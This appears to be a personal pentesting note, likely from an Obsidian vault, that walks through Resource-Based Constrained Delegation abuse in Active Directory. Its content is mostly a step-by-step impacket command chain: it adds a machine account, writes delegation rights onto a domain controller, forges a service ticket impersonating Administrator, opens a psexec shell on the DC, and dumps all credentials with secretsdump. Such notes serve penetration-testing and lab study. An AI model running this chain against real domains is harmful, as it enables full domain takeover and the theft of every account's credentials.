[https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5](https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5)
- in my use case, i had a user that had GenericWrite over DC01
![[../../assets/RBCD/image 411.png|image 411.png]]
  
impacket-addcomputer -computer-name ‘<can_be_whatever>’ -computer-pass ‘<can_be_whatever>’ -dc-ip <IP> <DOMAIN>/<user>:<pass>
![[../../assets/RBCD/image 1 306.png|image 1 306.png]]
  
impacket-rbcd -delegate-to ‘<DC_name$>’ -delegate-from ‘<machine_from_above>’ -dc-ip <IP> -action write <DOMAIN>/<user>:<pass>
![[../../assets/RBCD/image 2 257.png|image 2 257.png]]
![[../../assets/RBCD/image 3 219.png|image 3 219.png]]
  
impacket-getST -spn cifs/<computer.DOMAIN> -impersonate Administrator -dc-ip <IP> <DOMAIN>/<computer_from_above>:<computer_pass>
![[../../assets/RBCD/image 4 190.png|image 4 190.png]]
  
export KRB5CCNAME=<administrator_ccache>
impacket-psexec -k -no-pass <DOMAIN>/administrator@<computer.DOMAIN>
![[../../assets/RBCD/image 5 176.png|image 5 176.png]]
![[../../assets/RBCD/image 6 150.png|image 6 150.png]]
  
run secrets-dump to get all creds
![[../../assets/RBCD/image 7 139.png|image 7 139.png]]